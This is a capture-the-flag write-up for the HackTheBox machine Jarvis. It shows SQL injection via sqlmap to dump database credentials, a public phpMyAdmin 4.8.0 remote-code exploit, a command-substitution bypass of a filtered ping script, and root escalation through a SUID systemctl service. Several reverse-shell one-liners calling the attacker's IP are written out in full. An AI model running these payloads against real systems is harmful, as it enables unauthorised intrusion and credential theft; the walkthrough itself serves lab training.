# Jarvis [HTB](https://app.hackthebox.com/machines/194)
![jarvis-01](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jarvis/img/jarvis-01.png)


## Recon 

After adding the target to my `/etc/hosts` file, I start scanning for open ports:

```bash
nmap -p- --min-rate 10000 jarvis.htb
```

![ports-02](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jarvis/img/ports-02.png)


Let's run a version detection scan againts these ports:

```bash
nmap -p 22,80,64999 -sCV jarvis.htb -oN nmap.result
```

![nmap-res-03](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jarvis/img/nmap-res-03.png)


We have the following:

+ An SSH server on port 22.
+ An Apache/2.4.25 server on ports 80 & 64999.


We have two services in HTTP and SSH running on the target. The site at port 80 has a title and seems to be powered by PHP, let's start with that. 


### Apache Port 80

If we browse towards `http://jarvis.htb/` we get the following:

![site-04](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jarvis/img/site-04.png)


The site looks nice, there are several buttons on the main page but only a portion of them actually lead somewhwre. Here are the valid links in the main page:

![links-05](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jarvis/img/links-05.png)


Each of these buttons links to a different php script located in the site's root directory. `Home` leads to the home page at `index.php`, `Dining & Bar` links to `dining-bar.php` which shows different meals you can order, but the `Take An Order` button doesn't work:

![order-06](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jarvis/img/order-06.png)


The `Rooms` button leads to `rooms-suites.php` which shows different rooms we can book:

![book-07](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jarvis/img/book-07.png)


If we hover over the `Book now!` button we will see a link towards `/room.php?cod=1`, if we follow the lin, we will be presented with a page showing only the selected room but there is nothing to do there. 


The interesting thing about the `room.php` script is that it takes an argument via the `cod` parameter. This is a place where we can input data as users which makes it an interesting target, but let's check the rest of the site. 


I also saw a `Sign In` button at the top right side of the main page but it leads to nowehere. 


At the very end of the main page I saw somthing interesting: 

![bottom-08](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jarvis/img/buttom-08.png)


We see a domain name of `supersecrethotel.htb` as well as a potential username of `logger`. It's worth to keep this username as a potential target as we continue in this machine. I also added the new domain to my `/etc/hosts` file and mapped it to the external IP of the target. 


At this point I decided to run a directory and file scan using:

```bash
ffuf -w /usr/share/wordlists/seclists/SecLists-master/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://jarvis.htb/FUZZ -e .txt,.xml,.html,.php
```

![ffuf-09](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jarvis/img/ffuf-09.png)


The most interesting finding here is the [phpmyadmin](https://en.wikipedia.org/wiki/PhpMyAdmin) entry, which is an open source administration tool for MySQL and MariaDB written primary in PHP. If we open this directory we are greeted to a login page:

![login-page-10](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jarvis/img/login-page-10.png)


I tried to guess different passwords for the `logger` user as well as sending some basic SQLi payloads but to no avail. The fact that we have a phpmyadmin interface though, is a strong indication that there is an SQL db somewhere in this enviorenment.


The rest of the ffuf scan results weren't super interesting, both `nav.php` and `footer.php` return a simplified version of the site's main page. The `connection.php` entry returns an empty response as can be seen in the ffuf scan.


While I was checking the different entries I also intercepted traffic in Butp Suite, and that's where I saw something unusual:

![header-11](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jarvis/img/header-11.png)


The server gave us the `IronWAF` header. I tried searching for this type of WAF online but I found nothing. My guess is this it's a custom WAF written by the box creator. 


At this point I decided to play around with the `cod` parameter of the `room.php` script, since we know we have a database somewhere in the environment, and as far as I saw, it's the only palce we can supply input besides the phpmyadmin login page. So I decided to run `sqlmap` as such:

```bash
sqlmap -u http://jarvis.htb/room.php?cod=4 -p cod --dbs --batch --proxy=http://localhost:8080  -A "NONE"
```

Here is the breakdown, `-p cod` tells sqlmap which parameter to test in the url. The `--dbs` switch tells sqlmap to retrive the available databases on the target. `--batch` is for automatic mode, `--proxy` is used to route the traffic through Burp in order to have traffic capture. And `-A "NONE"` is used to try and trick the WAF my sending `NONE` as the value for the user-agent HTTP header. 


This scan resulted in the following:

![sqli-12](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jarvis/img/sqli-12.png)

![dbs-13](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jarvis/img/dbs-13.png)


The `cod` parameter is susceptible to various types of SQLI payloads, and `sqlmap` managed to get the available databases.


I started by pulling the tables for the `hotel` database but it only had the `room` table, which has the different rooms and thier attributes like, price, etc. Not super useful, we are looking for credentials for the `phpmyadmin` portal. 


So instead I decided to list the tables in the `mysql` database:

```bash
sqlmap -u http://jarvis.htb/room.php?cod=4 -p cod -D mysql --tables --batch -A "NONE"
```

![mysql-tables-14](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jarvis/img/mysql-tables-14.png)


The `user` tabel seems interesting, let's dump it out:

```bash
sqlmap -u http://jarvis.htb/room.php?cod=4 -p cod -D mysql -T user --dump --batch -A "NONE"
```

![pass-15](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jarvis/img/pass-15.png)


The output is a bit messy, but we have a password hash, and `sqlmap` cracked it for us to `imissyou`. The user name is `DBadmin`. We can use these credentials to login to the `phpmyadmin` portal:

![portal-16](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jarvis/img/portal-16.png)


Inside the admin panel we can see that the version of `phpmyadmin` is 4.8.0. If we search online we can find an [RCE exploit](https://www.exploit-db.com/exploits/50457) for versions 4.8.0 - 4.8.1. You can read more about the vulnerability [here](https://medium.com/@happyholic1203/phpmyadmin-4-8-0-4-8-1-remote-code-execution-257bcc146f8e).


### Exploit


Let's go over the exploit quickly. After the script makes a couple of requests to retrive cookies needed for the phpmyadmin session, the main exploit abuses the `import.php` script of `phpmyadmin`:

![exploit-17](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jarvis/img/exploit-17.png)


We can see the script is injecting a simple PHP web shell wrapped inside an SQL query into a database. Then, it executes this php code by retriving said database with what looks like an LFI vulnerability. 


All in all the exploit looks solid, let's try it out:

```bash
python3 pma-4.8.0-rce.py 10.129.229.137 80 /phpmyadmin DBadmin imissyou id
```

Here is the breakdown of the command-line argumnets: 

+ Target IP.
+ Target port.
+ Path to the `phpmyadmin` portal.
+ Username.
+ Password.
+ Command to run. 


![rce-18](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jarvis/img/rce-18.png)


It worked! Now it's a matter of finding a valid payload for a reverse shell. 


First, I start a local listener on my attack machine with:

```bash
rlwrap nc -lnvp 443
```

And after a bit of trial and error I found that a netcat based payload works:

```bash
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.34 443 >/tmp/f
```

![shell-19](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jarvis/img/shell-19.png)


## Privilege Escalation


After landing on the machine I spwan a TTY shell by running:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

Then I list any sudo permissions we have as the `www-data` service account:

![www-sudo-20](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jarvis/img/www-sudo-20.png)


We are able to run this `simpler.py` script as the `pepper` user, which is the only user account on the system:

![users-21](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jarvis/img/users-21.png)


Let's take a look at this script:

```
#!/usr/bin/env python3                                                                                   
from datetime import datetime                                  
import sys                                                     
import os                                                      
from os import listdir                                         
import re                                                      
                                                                           
---snip---

def exec_ping():                                                                                         
    forbidden = ['&', ';', '-', '`', '||', '|']                                                          
    command = input('Enter an IP: ')                                                                     
    for i in forbidden:                                                                                  
        if i in command:                                                                                 
            print('Got you')                                                                             
            exit()                                                                                       
    os.system('ping ' + command)                                                                         

if __name__ == '__main__':                                                                               
    show_header()                                                                                        
    if len(sys.argv) != 2:                                                                               
        show_help()                                                                                      
        exit()                                                                                           
    if sys.argv[1] == '-h' or sys.argv[1] == '--help':
        show_help()                                                                                      
        exit()                                                                                           
    elif sys.argv[1] == '-s':                                                                            
        show_statistics()                                                                                
        exit()                                                                                           
    elif sys.argv[1] == '-l':                                                                            
        list_ip()                                                                                        
        exit()                                                                                           
    elif sys.argv[1] == '-p':                                                                            
        exec_ping()                                                                                      
        exit()                                                                                           
    else:                                                                                                
        show_help()                                                                                      
        exit()        
```


The script is a bit long, but most of it is completely irrelevant, the only thing that matters is the `exec_ping` function which I copied above. 


This function executes the `ping` command to a specified host via the `system` method of the OS python module. The function starts by defining a "forbidden" list of bash operators, commonly used to perform command injection, in order to block the user from attempting command injection. The issue is that they forgot the `$()` command substitution operator. 


To exploit this, I decided to create a reverse shell script, then call it inside the command substitution operator when we run this script as pepper. 


I created the script on the target as such:

```bash
echo "bash -i >& /dev/tcp/10.10.14.34/445 0>&1" > /tmp/htb.sh
chmod +x /tmp/htb.sh
```

Then I Started the local listener for the reverse shell connection on my attack machine:

```bash
rlwrap nc -lnvp 445
```

And now I ran the simpler script as pepper and typed in something like this:

![exec-22](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jarvis/img/exec-22.png)


The shell stalls which is a great sign, and on my netcat listener I get a shell as `pepper`:

![pepper-23](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jarvis/img/pepper-23.png)


### Pepper

After landing on a shell as `pepper` I spwan a TTY shell same as before and list my sudo permissions, but I got prompted for credentials which I don't have at this point. 


So I start looking around pepper's home folder and I find this `Web` directory which was also present in the `simpler.py` script:

![pepper-home-24](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jarvis/img/pepper-home-24.png)


Inside this directory there is another directory called `Logs` and inside it, a single file named as my attack machine's IP:

![logs-25](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jarvis/img/logs-25.png)


The interesting thing about this file is that it's owned by root, why? is there some backgrund task? 


Anyway let's read this file:

![gets-26](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jarvis/img/gets-26.png)


This is near the end of the file, but the general structure throughout the file is the same. These look like the web request we made when we ran `ffuf`. 


I wasn't sure what to do with this information exactly, so I decided to shift gears and list running processes with `ps auxww`:

![defender-27](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jarvis/img/defender-27.png)


We can see root is running this `sqli_defender.py` script located in he's home directory. Whatever this script is doing we can probably guess it's not doing a really good job at preventing SQLi. But we can't access it because we dont have permissions to root's home folder. 


Outside of this script I didn't notice anything super unusual, I listed the processes several times to try and catch any quick scripts running but to no avail. I tried using [pspy64](https://github.com/DominicBreuker/pspy) but this didn't give me any additional info. 


I also checked systemd timers with: `systemctl list-timers --all` and checked the `/etc/crontab` file but I didn't find any timed jobs. 


At this point I got stuck a bit, I wasn't sure what to do next, and how we can access this `/root/sqli_defender.py` script. 


Eventually I decided to shift gears and try to find any SUID bnaries on the system:

```bash
find / -perm -4000 2>/dev/null
```

![suids-28](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jarvis/img/suids-28.png)


The `systemctl` command typically doens't have a SUID bit set on it. If we list the permissions to the file we see the following:

![perms-29](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jarvis/img/perms-29.png)


We can see our user's group is defined for this binary, and only users in that group and root can execute this binary. 


If we check [GTFObins](https://gtfobins.github.io/gtfobins/systemctl/#suid) we can see a possible escalation path. They propose making a service and adding a reverse shell as the `ExecStart` field. 


I created the `htb.service` file in my attack machine and it looks like this:

```bash
[Service]
Type=oneshot
ExecStart=/bin/bash -c "nc -e /bin/bash 10.10.14.34 8888"
[Install]
WantedBy=multi-user.target
```

Now I host this file via a python server:

```bash
python3 -m http.server 80
```

And download the file from the target machine using:

```bash
wget http://10.10.14.34/htb.service
```

Next I start my local listener same as before:

```bash
rlwrap nc -lnvp 8888
```


And run `systemctl` to link and enable the service:

```bash
./systemctl link /home/pepper/htb.service
./systemctl enable --now /home/pepper/htb.service
```

This stalls my shell window:

![exec-30](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jarvis/img/exec-30.png)


And on my netcat listener I recevie the connection:

![root-31](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jarvis/img/root-31.png)
